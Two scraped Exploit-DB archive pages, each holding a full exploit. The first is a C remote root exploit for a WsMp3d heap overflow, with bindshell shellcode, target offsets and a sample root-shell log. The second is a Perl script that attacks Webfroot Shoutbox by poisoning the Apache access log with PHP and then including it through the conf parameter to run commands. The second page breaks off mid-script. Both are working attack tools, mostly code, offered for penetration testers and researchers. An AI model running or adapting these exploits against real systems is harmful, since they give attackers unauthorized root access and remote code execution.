WsMp3d 0.x - Remote Heap Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWsMp3d 0.x - Remote Heap OverflowEDB-ID:33CVE:2003-0339EDB Verified:Author:Xpl017ElzType:remoteExploit:/Platform:LinuxDate:2003-05-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/***** [*] Title: Remote Heap Corruption Overflow vulnerability in WsMp3d** [+] Exploit: 0x82-Remote.WsMp3d.again.c**** bash$ ./0x82--Remote.WsMp3d.again -h 61.37.xxx.xx -t2****  WsMp3 Server Heap Corruption Remote root exploit**                                             by Xpl017Elz.**  [+] Hostname: 61.37.xxx.xx**  [+] Port num: 8000**  [+] Retloc address: 0x8058d8c**  [+] Retaddr address: 0x80648bf**  [1] #1 Set socket.**  [2] First, send exploit packet.**  [3] #2 Set socket.**  [4] Second, send exploit packet.**  [5] Waiting, executes the shell ! (3Sec)**  [6] Trying 61.37.xxx.xx:36864 ...**  [7] Connected to 61.37.xxx.xx:36864 !****  [*] Executed shell successfully !**** Linux xpl017elz 2.2.12-20kr #1 Tue Oct 12 17:08:15 KST 1999 i586 unknown** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),** 6(disk),10(wheel)** bash#*****/#include <stdio.h>#include <unistd.h>#include <sys/socket.h>#include <netdb.h>#include <netinet/in.h>struct op_plat_st{int op_plat_num;char *op_plat_sys;u_long retloc;u_long retaddr;int off_st;};struct op_plat_st __pl_form[]={/*{num,linux,globl val,heap val}*/{0,"Linux WsMp3 Binary I (Default)",0x08059490,0x08064e8f,0},{1,"Linux WsMp3 Binary II (Default)",0x08059490,0x08063e97,0},//08058d8c R_386_JUMP_SLOT   malloc{2,"RedHat Linux 6.1 (Compile)",0x08058d8c,0x080648bf,0},{3,"RedHat Linux 6.2 (Compile)",0x08058d8c,0x080646f3,0},{4,"RedHat Linux 7.0 (Compile)",0x0809aa68,0x080a5cb3,0},{5,"Linux all DoS (Compile)",0x82828282,0x82828282,0},/*	{6,"RedHat Linux 7.1",0x0,0x0,1},{7,"RedHat Linux 8.0",0x0,0x82828282,1},{8,"RedHat Linux 9.0",0x0,0x82828282,1},*/{0x82,NULL,0,0,0}};int sexsock(char *conn_host_nm,int conn_port_nm);void start_shell(int st_sock_va);void re_connt_lm(int st_sock_va);void __xpl_banrl();void x_fp_rm_usage(char *x_fp_rm);int __eat_sucks_heap_data_send(int st_sock_va,u_long fd_sx,u_long bk_sx);void __xpl_banrl(){fprintf(stdout,"\n WsMp3 Server Heap Corruption Remote root exploit (Again)\n");fprintf(stdout,"                                            by Xpl017Elz.\n");}void x_fp_rm_usage(char *x_fp_rm){int __t_xmp=0;fprintf(stdout,"\n Usage: %s -[option] [arguments]\n\n",x_fp_rm);fprintf(stdout,"\t -h [hostname] - target host.\n");fprintf(stdout,"\t -p [port]     - port number.\n");fprintf(stdout,"\t -r [addr]     - retloc address. (malloc globl)\n");fprintf(stdout,"\t -s [addr]     - &shellcode address.\n\n");fprintf(stdout," Example> %s -h target_hostname -p 8000\n",x_fp_rm);fprintf(stdout," Select target number>\n\n");for(;;){if(__pl_form[__t_xmp].op_plat_num==(0x82))break;else{fprintf(stdout,"\t {%d} %s\n",__pl_form[__t_xmp].op_plat_num,__pl_form[__t_xmp].op_plat_sys);}__t_xmp++;}fprintf(stdout,"\n");exit(0);}/*** name: desc->action (free)** content: chat cmd ("CHA")** content size: 3** buffer size: 4+12 (Bin:1000[0])**** name: desc->what** content: garbage (clear)** content size: 1024** buffer size: 4+4+1+1024 (Bin:1000000100[1])*/int __eat_sucks_heap_data_send(int st_sock_va,u_long fd_sx,u_long bk_sx){int wy_clean_data_q;char nop_n_jump[]={0x42,0x0c,0xeb,0x41};int atk_buf_pos=0;char oxa_oxd[]={0x0a,0x0d};#define PORT_Q (36864)#define __CLN_DT_LEN ((0x00000400)+(0x00000001))char step_atk_code_st[PORT_Q];#define __OF_BY_ONE (0x01)char p_rev_size[]={0xfc,0xff,0xff,0xff}; /* chunk size */char __size_fd[]={0xff,0xff,0xff,0xff}; /* data section size */char cln_dt_buf[__CLN_DT_LEN];char chat_inf_send_code[]={0x43,0x48,0x41};char shellcode[]={/* bindshell port 36864 */0xeb,0x72,0x5e,0x29,0xc0,0x89,0x46,0x10,0x40,0x89,0xc3,0x89,0x46,0x0c,0x40,0x89,0x46,0x08,0x8d,0x4e,0x08,0xb0,0x66,0xcd,0x80,0x43,0xc6,0x46,0x10,0x10,0x66,0x89,0x5e,0x14,0x88,0x46,0x08,0x29,0xc0,0x89,0xc2,0x89,0x46,0x18,0xb0,0x90,0x66,0x89,0x46,0x16,0x8d,0x4e,0x14,0x89,0x4e,0x0c,0x8d,0x4e,0x08,0xb0,0x66,0xcd,0x80,0x89,0x5e,0x0c,0x43,0x43,0xb0,0x66,0xcd,0x80,0x89,0x56,0x0c,0x89,0x56,0x10,0xb0,0x66,0x43,0xcd,0x80,0x86,0xc3,0xb0,0x3f,0x29,0xc9,0xcd,0x80,0xb0,0x3f,0x41,0xcd,0x80,0xb0,0x3f,0x41,0xcd,0x80,0x88,0x56,0x07,0x89,0x76,0x0c,0x87,0xf3,0x8d,0x4b,0x0c,0xb0,0x0b,0xcd,0x80,0xe8,0x89,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68};int send_shcode_lsz=sizeof(shellcode);memset((char *)cln_dt_buf,0x82,sizeof(cln_dt_buf));memset((char *)step_atk_code_st,0,sizeof(step_atk_code_st));/*desc->action:malloc(10); // cleanup*/memcpy(step_atk_code_st+atk_buf_pos,chat_inf_send_code,sizeof(chat_inf_send_code));atk_buf_pos+=(sizeof(chat_inf_send_code));memset(step_atk_code_st+atk_buf_pos,0x20,__OF_BY_ONE);atk_buf_pos+=(__OF_BY_ONE);/*void rem_req_descriptor(req_descriptor *desc);desc->what[sizeof(desc->what)]='\0';free(desc->what);desc->what=NULL;*/memcpy(step_atk_code_st+atk_buf_pos,cln_dt_buf,sizeof(cln_dt_buf));atk_buf_pos+=(sizeof(cln_dt_buf));/* chunk size */memcpy(step_atk_code_st+atk_buf_pos,p_rev_size,sizeof(p_rev_size));atk_buf_pos+=(sizeof(p_rev_size));/* data section size */memcpy(step_atk_code_st+atk_buf_pos,__size_fd,sizeof(__size_fd));atk_buf_pos+=(sizeof(__size_fd));{*(long *)&step_atk_code_st[atk_buf_pos]=(fd_sx-(0x0c));atk_buf_pos+=4; /* forward ptr */*(long *)&step_atk_code_st[atk_buf_pos]=(bk_sx);atk_buf_pos+=4; /* back ptr */}memset(step_atk_code_st+atk_buf_pos,0x20,__OF_BY_ONE);atk_buf_pos+=(__OF_BY_ONE);for(wy_clean_data_q=0;wy_clean_data_q<0x190;wy_clean_data_q+=4){memcpy(step_atk_code_st+atk_buf_pos,nop_n_jump,sizeof(nop_n_jump));atk_buf_pos+=(sizeof(nop_n_jump));}memcpy(step_atk_code_st+atk_buf_pos,shellcode,sizeof(shellcode));atk_buf_pos+=(sizeof(shellcode));memcpy(step_atk_code_st+atk_buf_pos,oxa_oxd,sizeof(oxa_oxd));atk_buf_pos+=(sizeof(oxa_oxd));send(st_sock_va,step_atk_code_st,strlen(step_atk_code_st),0);return(st_sock_va);}int main(int argc,char *argv[]){int sock,tg_sk;#define D_PORT (8000)#define ATK_CPT (36864)int port=(D_PORT);#define D_HOST "x82.inetcop.org"char hostname[0x82]=D_HOST;int whlp,type=0;u_long retloc=__pl_form[type].retloc;u_long retaddr=__pl_form[type].retaddr;(void)__xpl_banrl();while((whlp=getopt(argc,argv,"T:t:R:r:S:s:H:h:P:p:IiXx"))!=EOF){extern char *optarg;switch(whlp){case 'T':case 't':if((type=atoi(optarg))<6){retloc=__pl_form[type].retloc;retaddr=__pl_form[type].retaddr;}else (void)x_fp_rm_usage(argv[0]);break;case 'R':case 'r':retloc=strtoul(optarg,NULL,0);break;case 'S':case 's':retaddr=strtoul(optarg,NULL,0);break;case 'H':case 'h':memset((char *)hostname,0,sizeof(hostname));strncpy(hostname,optarg,sizeof(hostname)-1);break;case 'P':case 'p':port=atoi(optarg);break;case 'I':case 'i':fprintf(stderr," Try `%s -?' for more information.\n\n",argv[0]);exit(-1);case '?':(void)x_fp_rm_usage(argv[0]);break;}}if(!strcmp(hostname,D_HOST)){(void)x_fp_rm_usage(argv[0]);}{fprintf(stdout," [+] Hostname: %s\n",hostname);fprintf(stdout," [+] Port num: %d\n",port);fprintf(stdout," [+] Retloc address: %p\n",retloc);fprintf(stdout," [+] Retaddr address: %p\n",retaddr);}fprintf(stdout," [1] #1 Set socket.\n");sock=(int)sexsock(hostname,port);(void)re_connt_lm(sock);fprintf(stdout," [2] First, send exploit packet.\n");sock=(int)__eat_sucks_heap_data_send(sock,retloc,retaddr);close(sock);fprintf(stdout," [3] #2 Set socket.\n");sock=(int)sexsock(hostname,port);(void)re_connt_lm(sock);fprintf(stdout," [4] Second, send exploit packet.\n");sock=(int)__eat_sucks_heap_data_send(sock,retloc,retaddr);fprintf(stdout," [5] Waiting, executes the shell ! (3Sec)\n");sleep(3);fprintf(stdout," [6] Trying %s:%d ...\n",hostname,(ATK_CPT));tg_sk=(int)sexsock(hostname,(ATK_CPT));(void)re_connt_lm(tg_sk);fprintf(stdout," [7] Connected to %s:%d !\n\n",hostname,(ATK_CPT));(void)start_shell(tg_sk);exit(0);}int sexsock(char *conn_host_nm,int conn_port_nm){int sock;struct hostent *sxp;struct sockaddr_in sxp_addr;if((sxp=gethostbyname(conn_host_nm))==NULL){herror(" [-] gethostbyname() error");return(-1);}if((sock=socket(AF_INET,SOCK_STREAM,0))==-1){perror(" [-] socket() error");return(-1);}sxp_addr.sin_family=AF_INET;sxp_addr.sin_port=htons(conn_port_nm);sxp_addr.sin_addr=*((struct in_addr*)sxp->h_addr);bzero(&(sxp_addr.sin_zero),8);if(connect(sock,(struct sockaddr *)&sxp_addr,sizeof(struct sockaddr))==-1){perror(" [-] connect() error");return(-1);}return(sock);}void start_shell(int st_sock_va){int died;char *command="uname -a; id; export TERM=vt100; exec bash -i\n";char readbuf[1024];fd_set rset;memset((char *)readbuf,0,sizeof(readbuf));fprintf(stdout," [*] Executed shell successfully !\n\n");send(st_sock_va,command,strlen(command),0);for(;;){fflush(stdout);FD_ZERO(&rset);FD_SET(st_sock_va,&rset);FD_SET(STDIN_FILENO,&rset);select(st_sock_va+1,&rset,NULL,NULL,NULL);if(FD_ISSET(st_sock_va,&rset)){died=read(st_sock_va,readbuf,sizeof(readbuf)-1);if(died<=0)exit(0);readbuf[died]=0;fprintf(stdout,"%s",readbuf);}if(FD_ISSET(STDIN_FILENO,&rset)){died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);if(died>0){readbuf[died]=0;write(st_sock_va,readbuf,died);}}}return;}void re_connt_lm(int st_sock_va){if(st_sock_va==-1){fprintf(stdout," [-] Failed.\n\n");fprintf(stdout," Happy Exploit ! :-)\n\n");exit(-1);}}// milw0rm.com [2003-05-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 34
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWebfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code ExecutionEDB-ID:34CVE:EDB Verified:Author:anonymousType:remoteExploit:/Platform:LinuxDate:2003-05-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## Webfroot Shoutbox < 2.32 on apache exploit#use IO::Socket;my $host = "127.0.0.1";my $port = 80;my $shoutbox = "shoutbox.php?conf=";my $shoutboxpath = "/shoutbox";my $cmd = "ls -l";my $conn;my $type;my @logs = ("/etc/httpd/logs/acces_log","/etc/httpd/logs/acces.log","/var/www/logs/access_log","/var/www/logs/access.log","/usr/local/apache/logs/access_log","/usr/local/apache/logs/access.log","/var/log/apache/access_log","/var/log/apache/access.log","/var/log/httpd/access_log","/var/log/httpd/access.log",#"D:/apps/Apache Group/Apache2/logs/access.log");my $qinit = "GET /<?\$h=fopen('/tmp/.ex','w+');fwrite(\$h,'Result:<pre><?system(\$cmd);?></pre>');fclose(\$h);?> HTTP/1.1\nHost: 127.0.0.1\nConnection: Close\n\n";my $conn;if ($ARGV[0] eq "x" || $ARGV[0] eq "r"){$type = $ARGV[0];}else {print "[x] Webfroot Shoutbox < 2.32 on apache exploit \n\n";print "Usage: \n Webfroot.pl (x|r) host [command] [path] [port]\n";print "\ttype\tx = exploit | r = run command (after run with x option)\n";print "\thost\thostname\n";print "\tcommand\tcommand to execute on remote server\n";print "\tpath\tpath to shoutbox installation ex: /shoutbox\n";print "\tport\tport number\n";exit;}if ($ARGV[1]){$host = $ARGV[1];}if ($ARGV[2]){$cmd = $ARGV[2];}if ($ARGV[3]){$shoutboxpath = $ARGV[3];}if ($ARGV[4]){$port = int($ARGV[4]);}$cmd =~ s/ /+/g;sub connect_to {#print "[x] Connect to $host on port $port ...\n";$conn = IO::Socket::INET->new (Proto => "tcp",PeerAddr => "$host",PeerPort => "$port",) or die "[*] Can't connect to $host on port $port ...\n";$conn-> autoflush(1);}sub connect_end {#print "[x] Close connection\n";close($conn);}sub exploit {my $access_log = $_[0];my $result = "";$access_log =~ s/ /+/g;my $query = "GET ${shoutboxpath}/${shoutbox}${access_log} HTTP/1.1\nHost: $host\nConnection: Close\n\n";print "$query";print "[x] Access log : ", $access_log ,"\n";&connect_to;print $conn $query;while ($line = <$conn>) {$result = $line;#print $result;};&connect_end;}sub run_cmd {my $conf="/tmp/.ex";#my $conf="d:/tmp/.ex";my $result = "";my $query = "GET ${shoutboxpath}/${shoutbox}${conf}&cmd=$cmd HTTP/1.1\nHost: $host\nConnection: Close\n\n";print "[x] Run command ...\n";&connect_to;print $conn $query;while ($line = <$conn>) {$result .= $line;};&connect_end;if ($result =~ /Result:/){print $result;} else {print $result;print "[*] Failed ...";}}sub insert_code {my $result = "";print "[x] Access log : ", $access_log ,"\n";print "[x] Insert php code into apache access log ...\n";&connect_to;print $conn "$qinit";while ($line = <$conn>) {$result .= $line;};&connect_end;print $result;}if ($type eq "x"){&insert_code;print "[x] Trying to exploit ...\n";for ($i = 0;$i <= $#logs; $i++){&exploit($logs[$i]);}&run_cmd;} else {&run_cmd;}# milw0rm.com [2003-05-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer 